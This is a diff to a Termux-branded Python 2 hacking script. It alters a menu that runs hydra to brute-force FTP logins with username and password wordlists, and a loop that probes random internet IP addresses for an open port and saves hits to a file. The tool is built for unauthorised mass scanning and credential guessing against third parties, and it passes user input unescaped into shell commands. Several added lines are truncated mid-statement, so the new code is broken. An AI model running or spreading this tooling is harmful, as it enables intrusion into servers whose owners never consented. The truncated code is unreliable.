@@ -7,7 +7,7 @@ print """
 __ ___/ _______
 _____ \________ __ \     Termux-Lab
 ____/ //_____/ / / /   VK: @termuxlab
-/____/ /_/ /_/
+/____/      /_/ /_/
 
 """
 print """\033[33m
@@ -108,44 +108,46 @@ elif port == 103:
  yn_ftp = input("\033[35m >>> ")
  if yn_ftp == 1:
   login_ftp = raw_input('\033[35m Login >>> ')
-  os.system("hydra -l "+ login_ftp +" -P 'pass.txt' ftp://"+ip_ftp)
+  os.system("hydra -l "+ login_ftp +" -P 'pass.txt' ftp>
  elif yn_ftp == 2:
-  print """Do you know the password? 
+  print """Do you know the password?
   [1] - Yes
   [2] - No
   """
   yn2_ftp = input("\033[35m >>> ")
   if yn2_ftp == 1:
    pass_ftp = raw_input('\033[35m Password >>> ')
-   os.system("hydra -L 'login.txt' -p "+ pass_ftp +" ftp://"+ip_ftp)
+   os.system("hydra -L 'login.txt' -p "+ pass_ftp +" ft>
   else:
-   os.system("hydra -L 'login.txt' -P 'pass.txt' ftp://"+ip_ftp)
+   os.system("hydra -L 'login.txt' -P 'pass.txt' ftp://>
 
 else:
  ports = input("\033[35m You port >>> ")
  print '\033[0m'
  names = ports
-downl = 0
-count = 0
-print '\033[35m Search servers...'
-print ''
-print ''
-while True:
- qrand = random.randint(1,225)
- wrand = random.randint(0,255)
- erand = random.randint(0,255)
- rrand = random.randint(0,255)
- host = str(qrand)+"."+ str(wrand)+"."+ str(erand)+"."+str(rrand)
- sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
- sock.settimeout(1)
- result = sock.connect_ex((host,ports))
- if result == 0:
-  print "\033[F\033[36m Servers:"+str(count)+" " + host + """ ~ port OPEN        """
-  count += 1
-  print ""
-  save_file = open("scan.txt", "a+")
-  save_file.write(" "+host+":"+str(ports)+"\n")
-  save_file.close()
- else:
-  print "\033[F\033[31m Servers:"+str(count)+" "+ str(host)+" - Close\033[0m      "
-  
+if port > 100:
+ print ''
+else:
+ downl = 0
+ count = 0
+ print '\033[35m Search servers...'
+ print ''
+ print ''
+ while True:
+  qrand = random.randint(1,225)
+  wrand = random.randint(0,255)
+  erand = random.randint(0,255)
+  rrand = random.randint(0,255)
+  host = str(qrand)+"."+ str(wrand)+"."+ str(erand)+".">
+  sock = socket.socket(socket.AF_INET, socket.SOCK_STRE>
+  sock.settimeout(0.2)
+  result = sock.connect_ex((host,ports))
+  if result == 0:
+   print "\033[F\033[36m Servers:"+str(count)+" " + hos>
+   count += 1
+   print ""
+   save_file = open("scan.txt", "a+")
+   save_file.write(" "+host+":"+str(ports)+"\n")
+   save_file.close()
+  else:
+   print "\033[F\033[31m Servers:"+str(count)+" "+ str(>
